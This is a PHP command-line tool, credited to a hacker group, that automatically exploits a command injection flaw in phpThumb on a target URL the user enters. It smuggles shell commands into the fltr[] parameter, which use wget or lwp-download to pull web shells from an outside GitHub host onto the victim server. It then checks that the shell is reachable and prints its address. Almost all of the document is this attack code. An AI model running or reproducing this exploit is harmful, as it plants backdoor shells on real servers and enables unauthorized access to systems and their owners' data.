<?php 
/*  phpThumb Command Injection Auto Exploiter
      D704T Hacker Team | Coded by ManToed
 */
 error_reporting(0);
echo "\n";
echo "\e[0;34m#############################################\n";
echo "\e[0;34m#   \e[1;36mphpThumb Command Injection Auto Exploit \e[0;34m#\n";
echo "\e[0;34m#   \e[1;36mD704T Hacker Team                       \e[0;34m#\n";
echo "\e[0;34m#   \e[1;36mCoded by ManToed                        \e[0;34m#\n";
echo "\e[0;34m#                                           #\n";
echo "\e[0;34m# \e[1;36mGithub : https://github.com/mantod/       \e[0;34m#\n";
echo "\e[0;34m#############################################\n";
 echo "\n\e[1;37m Ex : http://site.com/[path]/phpthumb/\n\n\n";
  $pthumb = "\e[1;37m[\e[1;35mphpThumb\e[1;37m]";
 echo "$pthumb\n\e[1;36mMasukin URL :\e[1;37m ";
$url = trim(fgets(STDIN));
//if($argv[1]==""){
	//echo "\nUsage: php thumb.php http://site.com/phpthumb/\n\n";}
//else{
//$url = $argv[1];
    $cuk = curl_init();
   curl_setopt($cuk, CURLOPT_URL, $url."/phpThumb.php?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlace%20line%20fail.jpg%20jpeg:fail.jpg;wget%20-S%20https://raw.githubusercontent.com/Rmdn19id/trash/master/s.php;rm%20s.php.1;&phpThumbDebug=9");
    curl_setopt($cuk, CURLOPT_RETURNTRANSFER, 1); 
    $output = curl_exec($cuk);
        $duaratus = curl_getinfo($cuk, CURLINFO_HTTP_CODE);
    curl_close($cuk);
    if($duaratus == 200){
    	echo "$pthumb \e[1;32mphpThumb.php Found\n";
    sleep (2);
        echo "$pthumb \e[1;33mTry Upload Shell....\n";
        sleep (2.5);
         $cek = curl_init();
       curl_setopt($cek, CURLOPT_URL, $url."/s.php");
        curl_setopt($cek, CURLOPT_FOLLOWLOCATION, 1);
       curl_setopt($cek, CURLOPT_RETURNTRANSFER, 1);
       $ceek = curl_exec($cek);
       $ceeks = curl_getinfo($cek, CURLINFO_HTTP_CODE);
       if(preg_match("/hekedbay/",$ceek) or $ceeks == 200){
           echo "$pthumb \e[1;32mUpload Success\n";
           sleep(1);
echo "\e[1;37mYour Access =>\e[1;32m $url/s.php\e[1;37m\n";
 }else{
 	echo "$pthumb \e[1;31mFailed To Upload Shell\n";
 sleep (1);
 echo "$pthumb \e[1;33mTrying bypass shell....\n";
          $bepas = curl_init();
curl_setopt($bepas, CURLOPT_URL, $url."/phpThumb.php?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlace%20line%20fail.jpg%20jpeg:fail.jpg;lwp-download%20https://raw.githubusercontent.com/Rmdn19id/trash/master/axc.php%20axc.php;&phpThumbDebug=9");
    curl_setopt($bepas, CURLOPT_RETURNTRANSFER, 1); 
    $pas = curl_exec($bepas);
        $duaribu = curl_getinfo($bepas, CURLINFO_HTTP_CODE);
    curl_close($bepas);}
    if($duaribu == 200){
        echo "$pthumb \e[1;33mUpload bypass shell...\n\n";
        sleep(2);
          $ck = curl_init();
       curl_setopt($ck, CURLOPT_URL, $url."/axc.php");
        curl_setopt($ck, CURLOPT_FOLLOWLOCATION, 1);
       curl_setopt($ck, CURLOPT_RETURNTRANSFER, 1);
       $ceeek = curl_exec($ck);
       $ceeeks = curl_getinfo($ck, CURLINFO_HTTP_CODE);
       if(preg_match("/hekedbay/",$ceeek) or $ceeeks == 200){
           echo "$pthumb \e[1;32mBypass Upload Success\n";
           sleep (1);
echo "\e[1;37mYour Access => \e[1;32m$url/axc.php\e[1;37m\n";
 }else{
 	echo "$pthumb \e[1;31m[!] Not Vuln / Directory Not writeable [!]\e[1;37m\n";
       }
       }
}if ($duaratus == 404){
       	echo "$pthumb \e[1;31m[!] phpThumb NotFound [!]\e[1;37m\n";
       }
?>
